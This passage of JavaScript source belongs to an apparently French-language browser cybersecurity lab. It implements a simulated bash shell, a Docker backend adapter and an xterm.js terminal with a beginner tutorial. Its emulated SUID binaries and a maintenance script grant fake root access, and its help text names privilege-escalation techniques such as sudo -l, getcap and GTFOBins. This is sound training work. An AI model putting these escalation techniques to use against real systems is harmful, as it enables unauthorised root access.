                     'Get:2 http://security.debian.org/debian-security bookworm-security InRelease [48.0 kB]\n' +
                     'Reading package lists... Done\n' +
                     'Building dependency tree... Done\n' +
                     'All packages are up to date.\n';
          } else if (sub === 'install') {
            if (!pkg) {
              stderr = 'apt install: specify a package name (ex: nmap, wireshark, binwalk)\n';
              exitCode = 1;
            } else {
              this.installedPackages.push(pkg);
              this.vfs.writeFile(`/usr/bin/${pkg}`, `ELF binary: ${pkg}\n`, { permissions: '0755', owner: 'root', group: 'root' }, this.user, this.eUID);
              stdout = `Reading package lists... Done\nBuilding dependency tree... Done\n` +
                       `The following NEW packages will be installed: ${pkg}\n` +
                       `Setting up ${pkg} ... Done\n` +
                       `[+] ${pkg} installé avec succès dans /usr/bin/${pkg} !\n`;
            }
          } else {
            stdout = 'Usage: apt [update | install <paquet>]\n';
          }
          break;
        }

        case 'ss':
        case 'netstat':
          stdout = 'State      Recv-Q Send-Q Local Address:Port               Peer Address:Port\n' +
                   'LISTEN     0      128    0.0.0.0:22                       0.0.0.0:*\n' +
                   'LISTEN     0      128    0.0.0.0:3333                     0.0.0.0:*\n' +
                   'LISTEN     0      511    0.0.0.0:80                       0.0.0.0:*\n' +
                   'LISTEN     0      128    127.0.0.1:8080                   0.0.0.0:*\n';
          break;

        case 'date':
          stdout = new Date().toUTCString() + '\n';
          break;

        case 'uptime':
          stdout = ' 10:00:00 up 12 days,  1 user,  load average: 0.05, 0.03, 0.00\n';
          break;

        case 'df':
          stdout = 'Filesystem     1K-blocks    Used Available Use% Mounted on\n' +
                   '/dev/sda1       41251120 4125800  35002420  11% /\n' +
                   'tmpfs            1024000       0   1024000   0% /dev/shm\n';
          break;

        case 'history':
          stdout = '    1  whoami\n    2  pwd\n    3  ls -la\n    4  cat notes.txt\n';
          break;

        case 'reset':
          this.vfs.reset();
          if (this.options.challenge) {
            this.vfs.applyChallenge(this.options.challenge);
          }
          this.setPrivilege(false);
          this.currentPath = '/home/operator';
          this.env.PWD = '/home/operator';
          this.lastExitCode = 0;
          stdout = '[+] Machine virtuelle réinitialisée à son état initial.\n';
          break;

        case 'help':
          stdout = '🛠️  BOÎTE À OUTILS BASH DU LAB (30+ COMMANDES RÉALISTES) :\n' +
                   '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                   '• Identité & Recon : whoami, id, hostname, uname -a, pwd\n' +
                   '• Fichiers & Navigation : ls [-la], cd <dossier>, cat <fichier>, head, tail, wc\n' +
                   '• Gestion des Fichiers : touch, mkdir, cp, mv, rm [-rf], echo "texte"\n' +
                   '• Recherche & Filtres : grep [-i, -v], find <dossier> [-perm -4000], pipes (|)\n' +
                   '• Permissions POSIX : chmod <droits> <fichier>, chown <user>:<group>\n' +
                   '• Élévation de Privilèges : sudo -l, getcap -r /, GTFOBins (find, python3)\n' +
                   '• Processus : ps aux, top, kill <pid>\n' +
                   '• Réseau : ping <hôte>, curl <url>, ss -tlpn, nmap <cible>, nc <port>\n' +
                   '• Utilitaires : clear (Ctrl+L), env, export VAR=val, which, apt, exit, reset\n' +
                   '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
          break;

        default: {
          let absProg = null;
          if (baseCmd.startsWith('/') || baseCmd.startsWith('./') || baseCmd.startsWith('../')) {
            absProg = this.vfs.resolvePath(this.currentPath, baseCmd, this.user);
          } else {
            const searchDirs = ['/usr/local/sbin', '/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin', this.currentPath];
            for (const d of searchDirs) {
              const testPath = this.vfs.normalizePath(`${d}/${baseCmd}`);
              if (this.vfs.getNode(testPath)) {
                absProg = testPath;
                break;
              }
            }
          }

          const progNode = absProg ? this.vfs.getNode(absProg) : null;
          if (progNode && progNode.type === 'file') {
            if (!this.vfs.checkPermission(progNode, 'x', this.user, this.eUID) && !progNode.suid) {
              stderr = `bash: ${baseCmd}: Permission denied\n`;
              exitCode = 126;
              break;
            }

            // SUID Binary execution
            if (progNode.suid) {
              if (absProg.includes('aegis-sync')) {
                this.setPrivilege(true);
                stdout = '[+] aegis-sync: Vérification des modules de sécurité Aegis Perimeter...\n' +
                         '[+] Bit SUID détecté ! Élévation eUID=0 (root) réussie (#).\n' +
                         '[+] Shell root interactif actif. Fais "whoami", "id" ou "cat /root/root.txt".\n';
                break;
              }
              if (absProg.includes('aegis-vault-ctl')) {
                this.setPrivilege(true);
                stdout = '[+] aegis-vault-ctl: Master Vault Daemon control interface.\n' +
                         '[+] Bit SUID détecté ! Prise de contrôle des privilèges root (#).\n' +
                         '[+] Fais "cat /root/root.txt" pour capturer le Root Flag final.\n';
                break;
              }
            }

            // Script de maintenance ou custom
            if (absProg.includes('aegis-backup.sh')) {
              if (progNode.content.includes('/bin/sh') || progNode.content.includes('root') || this.isRoot || this.eUID === 0) {
                this.setPrivilege(true);
                stdout = '[+] aegis-backup.sh: Exécution du script de maintenance...\n' +
                         '[+] Script exécuté avec les privilèges de service root (#) !\n';
              } else {
                stdout = '[+] aegis-backup.sh: Sauvegarde standard complétée.\n';
              }
              break;
            }

            stdout = `[+] Executed ${absProg} successfully.\n`;
            break;
          }

          stderr = `bash: ${baseCmd}: command not found. Tape 'help' pour la liste des outils.\n`;
          exitCode = 127;
          break;
        }
      }

      // Traitement de la redirection de sortie vers fichier
      if (redirectFile !== null) {
        try {
          const absTarget = this.vfs.resolvePath(this.currentPath, redirectFile, this.user);
          let fileContent = stdout || '';
          if (appendMode) {
            try {
              const prev = this.vfs.readFile(absTarget, this.user, this.eUID);
              fileContent = prev + (stdout || '');
            } catch (e) {}
          }
          this.vfs.writeFile(absTarget, fileContent, { owner: this.user, group: this.user }, this.user, this.eUID);
          stdout = '';
        } catch (e) {
          stderr = `bash: ${redirectFile}: ${e.message}\n`;
          exitCode = 1;
        }
      }

      if (silenceStderr) {
        stderr = '';
      }

      return { stdout, stderr, exitCode };
    }

    async getCompletions(currentLine) {
      if (!currentLine) return [];
      const parts = currentLine.split(/\s+/);
      const isCommandPosition = parts.length <= 1;
      const lastToken = parts[parts.length - 1] || '';

      const commands = [
        'whoami', 'id', 'hostname', 'uname', 'pwd', 'ls', 'cd', 'mkdir', 'touch',
        'cp', 'mv', 'rm', 'cat', 'head', 'tail', 'wc', 'grep', 'find', 'chmod',
        'chown', 'ps', 'top', 'kill', 'clear', 'echo', 'env', 'export', 'ping',
        'curl', 'nmap', 'ssh', 'nc', 'netcat', 'sudo', 'su', 'getcap', 'python3',
        'which', 'apt', 'ss', 'date', 'uptime', 'df', 'history', 'reset', 'help', 'exit'
      ];

      if (isCommandPosition && !lastToken.includes('/')) {
        return commands.filter(c => c.startsWith(lastToken));
      }

      // File & path completion
      let searchDir = this.currentPath;
      let filePrefix = lastToken;
      let pathPrefix = '';

      if (lastToken.includes('/')) {
        const lastSlash = lastToken.lastIndexOf('/');
        pathPrefix = lastToken.slice(0, lastSlash + 1);
        filePrefix = lastToken.slice(lastSlash + 1);
        searchDir = this.vfs.resolvePath(this.currentPath, pathPrefix, this.user);
      }

      try {
        const entries = this.vfs.listDir(searchDir, this.user, this.eUID);
        const matches = entries
          .filter(e => e.name.startsWith(filePrefix))
          .map(e => pathPrefix + e.name + (e.type === 'dir' ? '/' : ''));
        return matches;
      } catch (e) {
        return [];
      }
    }
  }

  // --------------------------------------------------------------------------
  // 5. DockerMachineBackend : Adaptateur Extensible pour Conteneurs Docker
  // --------------------------------------------------------------------------
  class DockerMachineBackend extends MachineBackend {
    constructor(containerId, options = {}) {
      super();
      this.containerId = containerId;
      this.options = options;
      this.fallback = new VirtualShellBackend(null, options);
    }

    async init() {
      try {
        const res = await fetch(`/api/machines/${this.containerId}/status`);
        if (res.ok) {
          return { success: true, mode: 'docker', containerId: this.containerId };
        }
      } catch (e) {}
      // Fallback gracieux sur le shell virtuel si docker indisponible
      return this.fallback.init();
    }

    async execute(cmdStr) {
      try {
        const res = await fetch(`/api/machines/${this.containerId}/exec`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ command: cmdStr })
        });
        if (res.ok) {
          const data = await res.json();
          return { stdout: data.stdout || '', stderr: data.stderr || '', exitCode: data.exitCode || 0 };
        }
      } catch (e) {}
      return this.fallback.execute(cmdStr);
    }

    async getCompletions(currentLine) {
      return this.fallback.getCompletions(currentLine);
    }
  }

  // --------------------------------------------------------------------------
  // 6. CyberTerminal : Terminal Interactif xterm.js & Contrôleur UI
  // --------------------------------------------------------------------------
  let terminalInstanceCounter = 0;

  class CyberTerminal {
    constructor(containerOrId, options = {}) {
      terminalInstanceCounter++;
      this.instanceId = terminalInstanceCounter;
      this.container = typeof document !== 'undefined'
        ? (typeof containerOrId === 'string' ? document.getElementById(containerOrId) : containerOrId)
        : containerOrId;
      this.options = options;
      this.vfs = new VirtualFileSystem();
      this.backend = new VirtualShellBackend(this.vfs, options);
      this.history = [];
      this.historyIndex = 0;
      this.currentLine = '';
      this.cursorPos = 0;
      this.xterm = null;
      this.fitAddon = null;
      const tutDone = (typeof localStorage !== 'undefined' && localStorage.getItem('cyberlab_tutorial_done') === 'true');
      this.tutorialActive = !tutDone;
      this.tutorialStep = 1;

      // Synchronisation rétro-compatible pour scripts externes
      this.fs = this.vfs.exportLegacyDictionary();
      this.permissions = this.vfs.exportLegacyPermissions();

      this.backend.onPrivilegeChange((priv) => {
        this.updateHeaderBadge();
        if (priv.isRoot && typeof window !== 'undefined' && window.cyberAudio) {
          window.cyberAudio.playVictory();
        }
      });

      this.render();
    }

    // Propriétés rétro-compatibles
    get isRoot() { return this.backend.isRoot; }
    set isRoot(v) { this.backend.setPrivilege(v); }
    get eUID() { return this.backend.eUID; }
    get currentPath() { return this.backend.currentPath; }
    set currentPath(v) { this.backend.currentPath = v; }

    getPrompt() {
      return this.backend.getPromptString();
    }

    render() {
      if (typeof document === 'undefined' || !this.container) return;
      this.container.innerHTML = '';

      // Wrapper sans collisions d'IDs globaux
      const wrapper = document.createElement('div');
      wrapper.className = 'cyber-terminal-wrapper flex flex-col h-full bg-[#030712] border border-slate-800 rounded-2xl shadow-2xl overflow-hidden font-mono select-none';
      wrapper.style.minHeight = '480px';
      this.wrapperElement = wrapper;

      // 1. Bandeau Header de la Machine
      const header = document.createElement('div');
      header.className = 'terminal-header bg-slate-950 px-4 py-2.5 border-b border-slate-800 flex items-center justify-between gap-3 text-xs select-none';
      header.innerHTML = `
        <div class="flex items-center gap-2">
          <div class="terminal-dots flex items-center gap-1.5">
            <span class="w-3 h-3 rounded-full bg-rose-500/80 inline-block shadow-sm"></span>
            <span class="w-3 h-3 rounded-full bg-amber-500/80 inline-block shadow-sm"></span>
            <span class="w-3 h-3 rounded-full bg-emerald-500/80 inline-block shadow-sm"></span>
          </div>
          <span class="text-slate-500 text-xs ml-1">|</span>
          <div class="term-title-badge flex items-center gap-2">
            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
            <span class="term-title-text font-black text-slate-300 text-[11px] tracking-wide">
              operator@cyberlab:~ (bash v5.2)
            </span>
          </div>
        </div>

        <div class="flex items-center gap-2">
          <button class="btn-term-tutorial px-2.5 py-1 rounded-lg bg-cyan-950/80 hover:bg-cyan-900 border border-cyan-800/80 text-cyan-300 font-bold text-[10px] transition-all flex items-center gap-1.5 shadow-sm" title="Guide interactif pour débutants">
            <span>🎓</span>
            <span>Tutoriel (2 min)</span>
          </button>
          <button class="btn-term-clear px-2.5 py-1 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-300 font-bold text-[10px] transition-all shadow-sm">
            Effacer
          </button>
          <button class="btn-term-reset px-2.5 py-1 rounded-lg bg-slate-900 hover:bg-rose-950/80 border border-slate-700 hover:border-rose-800 text-slate-400 hover:text-rose-300 font-bold text-[10px] transition-all shadow-sm" title="Réinitialiser l'état initial du système de fichiers">
            ↻ Reset
          </button>
        </div>
      `;

      // 2. Bannière Tutoriel Interactif pour Débutants (optionnelle)
      const tutorialBanner = document.createElement('div');
      tutorialBanner.className = `term-tutorial-banner ${this.tutorialActive ? '' : 'hidden'} bg-gradient-to-r from-cyan-950/90 to-slate-950 p-3 border-b border-cyan-800/60 flex items-center justify-between text-xs font-sans animate-fadeIn`;
      tutorialBanner.innerHTML = `
        <div class="flex items-center gap-3">
          <div class="w-8 h-8 rounded-xl bg-cyan-500/20 border border-cyan-500/40 flex items-center justify-center text-cyan-400 text-base font-bold font-mono">
            1/5
          </div>
          <div>
            <div class="text-[11px] font-black uppercase text-cyan-400 font-mono tracking-wider">TUTORIEL DÉBUTANT // ÉTAPE 1 : IDENTITÉ</div>
            <div class="text-xs text-slate-200 font-medium">Découvre qui tu es sur ce système. Tape <code class="px-1.5 py-0.5 rounded bg-slate-900 border border-cyan-800 font-mono text-cyan-300 font-bold">whoami</code> puis appuie sur <strong>Entrée</strong>.</div>
          </div>
        </div>
        <button class="btn-close-tut px-2 py-1 text-slate-400 hover:text-white text-xs font-mono">✕ Passer</button>
      `;

      // 3. Conteneur xterm.js
      const body = document.createElement('div');
      body.className = 'terminal-body flex-1 p-3 bg-[#02050e] overflow-hidden relative cursor-text';

      wrapper.appendChild(header);
      wrapper.appendChild(tutorialBanner);
      wrapper.appendChild(body);
      this.container.appendChild(wrapper);

      this.headerElement = header;
      this.tutorialBanner = tutorialBanner;
      this.bodyElement = body;

      // Boutons d'action
      header.querySelector('.btn-term-clear').addEventListener('click', () => this.clear());
      header.querySelector('.btn-term-reset').addEventListener('click', () => this.reset());
      header.querySelector('.btn-term-tutorial').addEventListener('click', () => this.toggleTutorial());
      tutorialBanner.querySelector('.btn-close-tut').addEventListener('click', () => this.hideTutorial());

      // Focus automatique dès clic n'importe où dans le terminal
      wrapper.addEventListener('click', () => {
        if (this.xterm) this.xterm.focus();
      });

      // Initialisation de xterm.js si disponible dans la page
      if (global.Terminal) {
        this.initXterm(body);
      } else {
        this.initHeadlessFallback(body);
      }
    }

    initXterm(mountElement) {
      const termOptions = {
        cursorBlink: true,
        cursorStyle: 'block',
        fontFamily: "'JetBrains Mono', 'Fira Code', Menlo, Monaco, Consolas, monospace",
        fontSize: 13,
        lineHeight: 1.25,
        theme: {
          background: '#02050e',
          foreground: '#e2e8f0',
          cursor: '#22d3ee',
          cursorAccent: '#02050e',
          selectionBackground: 'rgba(34, 211, 238, 0.3)',
          black: '#090d16',
          red: '#f43f5e',
          green: '#10b981',
          yellow: '#f59e0b',
          blue: '#3b82f6',
          magenta: '#c084fc',
          cyan: '#06b6d4',
          white: '#f8fafc',
          brightBlack: '#475569',
          brightRed: '#fb7185',
          brightGreen: '#34d399',
          brightYellow: '#fbbf24',
          brightBlue: '#60a5fa',
          brightMagenta: '#d8b4fe',
          brightCyan: '#22d3ee',
          brightWhite: '#ffffff'
        },
        convertEol: true,
        scrollback: 5000,
        disableStdin: false
      };

      this.xterm = new global.Terminal(termOptions);

      if (global.FitAddon && global.FitAddon.FitAddon) {
        this.fitAddon = new global.FitAddon.FitAddon();
        this.xterm.loadAddon(this.fitAddon);
      }

      this.xterm.open(mountElement);

      if (this.fitAddon) {
        setTimeout(() => {
          try { this.fitAddon.fit(); } catch (e) {}
        }, 50);
      }

      // Écouteur de redimensionnement
      window.addEventListener('resize', () => {
        if (this.fitAddon) {
          try { this.fitAddon.fit(); } catch (e) {}
        }
      });

      // Focus immédiat
      this.xterm.focus();

      // MOTD d'accueil Linux haute fidélité
      this.printMOTD();

      // Affichage du prompt initial
      this.writePrompt();

      // Custom key handler pour copier la sélection nativement avec Ctrl+C
      this.xterm.attachCustomKeyEventHandler((event) => {
        if ((event.ctrlKey || event.metaKey) && (event.key === 'c' || event.key === 'C') && this.xterm.hasSelection()) {
          return false;
        }
        return true;
      });

      // Gestion des saisies clavier
      this.setupKeyHandlers();
    }

    printMOTD() {
      if (!this.xterm) return;
      const targetHost = (this.options.challenge?.title || 'CYBERLAB TARGET');
      const targetIp = (this.options.instance?.virtual_ip || '10.30.45.88');

      this.xterm.writeln('\x1b[1;36m' + '═'.repeat(68) + '\x1b[0m');
      this.xterm.writeln(`  \x1b[1;32m● CYBERLAB OFFENSIVE WORKSTATION v2.4 (Debian 12 bookworm)\x1b[0m`);
      this.xterm.writeln(`  \x1b[1;34mCible active   :\x1b[0m ${targetHost} (\x1b[1;33m${targetIp}\x1b[0m)`);
      this.xterm.writeln(`  \x1b[1;34mSession        :\x1b[0m operator (UID: 1001, GID: 1001, groups: sudo)`);
      this.xterm.writeln(`  \x1b[1;34mRépertoire     :\x1b[0m /home/operator`);
      this.xterm.writeln(`  \x1b[0;37mTape \x1b[1;33mhelp\x1b[0;37m pour la boîte à outils, ou clique sur \x1b[1;36m🎓 Tutoriel (2 min)\x1b[0;37m.\x1b[0m`);
      this.xterm.writeln('\x1b[1;36m' + '═'.repeat(68) + '\x1b[0m');
      this.xterm.writeln('');
    }

    writePrompt() {
      if (!this.xterm) return;
      this.xterm.write(this.backend.getAnsiPrompt());
      this.currentLine = '';
      this.cursorPos = 0;
    }

    setupKeyHandlers() {
      this.xterm.onData((data) => {
        this.handleTermData(data);
      });
    }

    async handleTermData(data) {
      if (!this.xterm) return;

      // 1. Enter (\r ou \n)
      if (data === '\r' || data === '\n') {
        this.xterm.writeln('');
        const line = this.currentLine.trim();

        if (line) {
          this.history.push(line);
          this.historyIndex = this.history.length;

          // Exécution via MachineBackend
          const res = await this.backend.execute(line);

          if (res.stdout) {
            const outLines = res.stdout.split('\n');
            outLines.forEach((l, i) => {
              if (i === outLines.length - 1 && l === '') return;
              this.xterm.writeln(l);
            });
          }

          if (res.stderr) {
            this.xterm.writeln('\x1b[31m' + res.stderr.replace(/\n$/, '') + '\x1b[0m');
          }

          // Gestion du tutoriel pas-à-pas
          if (this.tutorialActive) {
            this.advanceTutorial(line);
          }
        }

        this.writePrompt();
        return;
      }

      // 2. Saisie avec sauts de ligne / Coller multi-lignes
      if (data.includes('\n') || data.includes('\r')) {
        const lines = data.split(/\r\n|\r|\n/);
        for (let i = 0; i < lines.length; i++) {
          const part = lines[i];
          if (part) {
            this.currentLine = this.currentLine.slice(0, this.cursorPos) + part + this.currentLine.slice(this.cursorPos);
            this.cursorPos += part.length;
            this.redrawLine();
          }
          if (i < lines.length - 1) {
            await this.handleTermData('\r');
          }
        }
        return;
      }

      // 3. Backspace (\x7f ou \b)
      if (data === '\x7f' || data === '\b') {
        if (this.cursorPos > 0) {
          this.currentLine = this.currentLine.slice(0, this.cursorPos - 1) + this.currentLine.slice(this.cursorPos);
          this.cursorPos--;
          this.redrawLine();
        }
        return;
      }

      // 4. Ctrl+C (\x03)
      if (data === '\x03') {
        this.xterm.writeln('^C');
        this.writePrompt();
        return;
      }

      // 5. Ctrl+L (\x0c) : Clear
      if (data === '\x0c') {
        this.clear();
        return;
      }

      // 6. Ctrl+U (\x15) : Effacer début de ligne
      if (data === '\x15') {
        this.currentLine = this.currentLine.slice(this.cursorPos);
        this.cursorPos = 0;
        this.redrawLine();
        return;
      }

      // 7. Ctrl+K (\x0b) : Effacer fin de ligne
      if (data === '\x0b') {
        this.currentLine = this.currentLine.slice(0, this.cursorPos);
        this.redrawLine();
        return;
      }

      // 8. Ctrl+A (\x01) : Aller au tout début de ligne
      if (data === '\x01') {
        while (this.cursorPos > 0) {
          this.xterm.write('\x1b[D');
          this.cursorPos--;
        }
        return;
      }

      // 9. Ctrl+E (\x05) : Aller à la toute fin de ligne
      if (data === '\x05') {
        while (this.cursorPos < this.currentLine.length) {
          this.xterm.write('\x1b[C');
          this.cursorPos++;
        }
        return;
      }

      // 10. Ctrl+W (\x17) : Supprimer le mot précédent
      if (data === '\x17') {
        if (this.cursorPos > 0) {
          const before = this.currentLine.slice(0, this.cursorPos);
          const after = this.currentLine.slice(this.cursorPos);
          const trimmed = before.replace(/\s+$/, '');
          const lastSpace = trimmed.lastIndexOf(' ');
          const newBefore = lastSpace === -1 ? '' : trimmed.slice(0, lastSpace + 1);
          this.currentLine = newBefore + after;
          this.cursorPos = newBefore.length;
          this.redrawLine();
        }
        return;
      }

      // 11. Tabulation (\t) : Autocomplétion
      if (data === '\t') {
        const candidates = await this.backend.getCompletions(this.currentLine);
        if (candidates.length === 1) {
          const parts = this.currentLine.split(/\s+/);
          const last = parts[parts.length - 1];
          const completion = candidates[0];
          this.currentLine = this.currentLine.slice(0, this.currentLine.length - last.length) + completion + (completion.endsWith('/') ? '' : ' ');
          this.cursorPos = this.currentLine.length;
          this.redrawLine();
          if (typeof window !== 'undefined' && window.cyberAudio) window.cyberAudio.playTactileClick();
        } else if (candidates.length > 1) {
          this.xterm.writeln('');
          this.xterm.writeln('\x1b[36m' + candidates.join('   ') + '\x1b[0m');
          this.xterm.write(this.backend.getAnsiPrompt() + this.currentLine);
        }
        return;
      }

      // 12. Flèches de navigation et touches spéciales (\x1b[... ou \x1bO...)
      if (data.startsWith('\x1b[') || data.startsWith('\x1bO')) {
        const code = data.slice(2);

        // Flèche Haut (\x1b[A ou \x1bOA)
        if (code === 'A') {
          if (this.historyIndex > 0) {
            this.historyIndex--;
            this.currentLine = this.history[this.historyIndex] || '';
            this.cursorPos = this.currentLine.length;
            this.redrawLine();
          }
          return;
        }

        // Flèche Bas (\x1b[B ou \x1bOB)
        if (code === 'B') {
          if (this.historyIndex < this.history.length - 1) {
            this.historyIndex++;
            this.currentLine = this.history[this.historyIndex] || '';
            this.cursorPos = this.currentLine.length;
            this.redrawLine();
          } else {
            this.historyIndex = this.history.length;
            this.currentLine = '';
            this.cursorPos = 0;
            this.redrawLine();
          }
          return;
        }

        // Flèche Droite (\x1b[C ou \x1bOC)
        if (code === 'C') {
          if (this.cursorPos < this.currentLine.length) {
            this.cursorPos++;
            this.xterm.write('\x1b[C');
          }
          return;
        }

        // Flèche Gauche (\x1b[D ou \x1bOD)
        if (code === 'D') {
          if (this.cursorPos > 0) {
            this.cursorPos--;
            this.xterm.write('\x1b[D');
          }
          return;
        }

        // Touche Home (\x1b[H ou \x1bOH ou \x1b[1~)
        if (code === 'H' || code === '1~') {
          while (this.cursorPos > 0) {
            this.xterm.write('\x1b[D');
            this.cursorPos--;
          }
          return;
        }

        // Touche End (\x1b[F ou \x1bOF ou \x1b[4~)
        if (code === 'F' || code === '4~') {
          while (this.cursorPos < this.currentLine.length) {
            this.xterm.write('\x1b[C');
            this.cursorPos++;
          }
          return;
        }

        // Touche Delete (\x1b[3~)
        if (code === '3~') {
          if (this.cursorPos < this.currentLine.length) {
            this.currentLine = this.currentLine.slice(0, this.cursorPos) + this.currentLine.slice(this.cursorPos + 1);
            this.redrawLine();
          }
          return;
        }

        return;
      }

      // 13. Caractères imprimables normaux
      if (data >= ' ' || data.length > 1) {
        this.currentLine = this.currentLine.slice(0, this.cursorPos) + data + this.currentLine.slice(this.cursorPos);
        this.cursorPos += data.length;
        this.redrawLine();
      }
    }

    redrawLine() {
      if (!this.xterm) return;
      // Efface la ligne courante et réécrit le prompt + currentLine
      this.xterm.write('\r\x1b[K');
      this.xterm.write(this.backend.getAnsiPrompt() + this.currentLine);
      // Repositionne le curseur
      const backCount = this.currentLine.length - this.cursorPos;
      if (backCount > 0) {
        this.xterm.write(`\x1b[${backCount}D`);
      }
    }

    clear() {
      if (this.xterm) {
        this.xterm.clear();
        this.writePrompt();
      }
    }

    reset() {
      this.backend.vfs.reset();
      if (this.options.challenge) {
        this.backend.vfs.applyChallenge(this.options.challenge);
      }
      this.backend.setPrivilege(false);
      this.backend.currentPath = '/home/operator';
      this.backend.env.PWD = '/home/operator';
      this.clear();
      this.printMOTD();
      this.writePrompt();
      if (typeof window !== 'undefined' && window.cyberAudio) window.cyberAudio.playSuccess();
    }

    updateHeaderBadge() {
      const label = this.headerElement?.querySelector('.term-title-text');
      if (label) {
        if (this.backend.isRoot) {
          label.innerHTML = `<span class="text-rose-500 font-black">root@cyberlab:~ [ROOT eUID=0]</span>`;
        } else {
          label.innerText = `operator@cyberlab:~ (bash v5.2)`;
        }
      }
    }

    // --- Mode Fallback Headless (quand xterm.js n'est pas dispo / tests Node) ---
    initHeadlessFallback(mountElement) {
      mountElement.innerHTML = `
        <div class="headless-terminal-output p-3 text-slate-300 font-mono text-xs whitespace-pre-wrap max-h-96 overflow-y-auto"></div>
        <div class="headless-prompt-line flex items-center gap-2 mt-2 pt-2 border-t border-slate-800">
          <span class="headless-prompt text-emerald-400 font-bold">${this.getPrompt()}</span>
          <input type="text" class="headless-input flex-1 bg-transparent border-0 outline-none text-white font-mono text-xs" placeholder="Tape une commande..." />
        </div>
      `;

      const out = mountElement.querySelector('.headless-terminal-output');
      const input = mountElement.querySelector('.headless-input');

      out.innerText = `[CYBERLAB TERMINAL // MODE EMULATION AUTONOME]\nTape "help" pour afficher les outils.\n\n`;

      input.addEventListener('keydown', async (e) => {
        if (e.key === 'Enter') {
          const cmd = input.value.trim();
          if (cmd) {
            out.innerText += `${this.getPrompt()} ${cmd}\n`;
            const res = await this.backend.execute(cmd);
            if (res.stdout) out.innerText += res.stdout;
            if (res.stderr) out.innerText += res.stderr;
            input.value = '';
            out.scrollTop = out.scrollHeight;
          }
        }
      });
    }

    // --- API Programmtique pour scripts et tests ---
    async runCommand(cmdStr) {
      if (this.xterm) {
        this.xterm.writeln(cmdStr);
      }
      this.history.push(cmdStr);
      const res = await this.backend.execute(cmdStr);
      if (this.xterm) {
        if (res.stdout) this.xterm.writeln(res.stdout.replace(/\n$/, ''));
        if (res.stderr) this.xterm.writeln('\x1b[31m' + res.stderr.replace(/\n$/, '') + '\x1b[0m');
        this.writePrompt();
      }
      if (this.tutorialActive) {
        this.advanceTutorial(cmdStr);
      }
      return res;
    }

    executePipeline(cmdStr) {
      return this.backend.execute(cmdStr);
    }

    // --- Tutoriel Interactif pour Débutants (2 min) ---
    toggleTutorial() {
      if (this.tutorialActive) {
        this.hideTutorial();
      } else {
        this.startTutorial();
      }
    }

    startTutorial() {
      this.tutorialActive = true;
      this.tutorialStep = 1;
      if (this.tutorialBanner) {
        this.tutorialBanner.classList.remove('hidden');
      }
      this.updateTutorialUI();
      if (this.xterm) this.xterm.focus();
    }

    hideTutorial() {
      this.tutorialActive = false;
      if (this.tutorialBanner) {
        this.tutorialBanner.classList.add('hidden');
      }
      if (typeof localStorage !== 'undefined') {
        try { localStorage.setItem('cyberlab_tutorial_done', 'true'); } catch (e) {}
      }
    }

    advanceTutorial(commandExecuted) {
      const cmd = commandExecuted.trim().toLowerCase();

      if (this.tutorialStep === 1 && cmd.startsWith('whoami')) {
        this.tutorialStep = 2;
        this.updateTutorialUI();
        if (typeof window !== 'undefined' && window.cyberAudio) window.cyberAudio.playSuccess();
      } else if (this.tutorialStep === 2 && cmd.startsWith('pwd')) {
        this.tutorialStep = 3;
        this.updateTutorialUI();
        if (typeof window !== 'undefined' && window.cyberAudio) window.cyberAudio.playSuccess();
      } else if (this.tutorialStep === 3 && (cmd.startsWith('ls') || cmd.startsWith('dir'))) {
        this.tutorialStep = 4;
        this.updateTutorialUI();
        if (typeof window !== 'undefined' && window.cyberAudio) window.cyberAudio.playSuccess();
      } else if (this.tutorialStep === 4 && cmd.startsWith('cat')) {
        this.tutorialStep = 5;
        this.updateTutorialUI();
        if (typeof window !== 'undefined' && window.cyberAudio) window.cyberAudio.playVictory();
      }
    }

    updateTutorialUI() {
      if (!this.tutorialBanner) return;

      const steps = [
        {
          num: '1/5',
          title: 'TUTORIEL DÉBUTANT // ÉTAPE 1 : IDENTITÉ',
          desc: 'Dans un terminal, tu n\'as pas de souris. Pour savoir qui tu es sur ce système, tape <code class="px-1.5 py-0.5 rounded bg-slate-900 border border-cyan-800 font-mono text-cyan-300 font-bold">whoami</code> puis appuie sur <strong>Entrée</strong>.'
        },
        {
          num: '2/5',
          title: 'TUTORIEL DÉBUTANT // ÉTAPE 2 : LOCALISATION',
          desc: 'Super ! Tu es connecté en tant que <strong>operator</strong>. Pour connaître le dossier où tu te trouves (Print Working Directory), tape <code class="px-1.5 py-0.5 rounded bg-slate-900 border border-cyan-800 font-mono text-cyan-300 font-bold">pwd</code>.'
        },
        {
          num: '3/5',
          title: 'TUTORIEL DÉBUTANT // ÉTAPE 3 : EXPLORATION',
          desc: 'Tu es dans <code>/home/operator</code>. Pour afficher tous les fichiers autour de toi (y compris cachés), tape <code class="px-1.5 py-0.5 rounded bg-slate-900 border border-cyan-800 font-mono text-cyan-300 font-bold">ls -la</code>.'
        },
        {
          num: '4/5',
          title: 'TUTORIEL DÉBUTANT // ÉTAPE 4 : LIRE UN FICHIER',
          desc: 'Génial ! Tu vois le fichier <code>notes.txt</code>. Pour lire son contenu à l\'écran, tape <code class="px-1.5 py-0.5 rounded bg-slate-900 border border-cyan-800 font-mono text-cyan-300 font-bold">cat notes.txt</code>.'
        },
        {
          num: '5/5',
          title: 'TUTORIEL DÉBUTANT // ÉTAPE 5 : PRÊT POUR LA MISSION !',
          desc: '🎉 <strong>Félicitations !</strong> Tu as appris les commandes de base (whoami, pwd, ls, cat). Consulte le panneau <strong>Mission</strong> à gauche pour valider ton premier objectif ! <button class="btn-finish-tut ml-3 px-2 py-0.5 rounded bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-xs font-mono">Terminer</button>'
        }
      ];

      const s = steps[this.tutorialStep - 1];
      if (!s) return;

      const numEl = this.tutorialBanner.querySelector('.w-8');
      if (numEl) numEl.innerText = s.num;
      const titleEl = this.tutorialBanner.querySelector('.uppercase');
      if (titleEl) titleEl.innerText = s.title;
      const descEl = this.tutorialBanner.querySelector('.text-slate-200');
      if (descEl) descEl.innerHTML = s.desc;

      const finishBtn = this.tutorialBanner.querySelector('.btn-finish-tut');
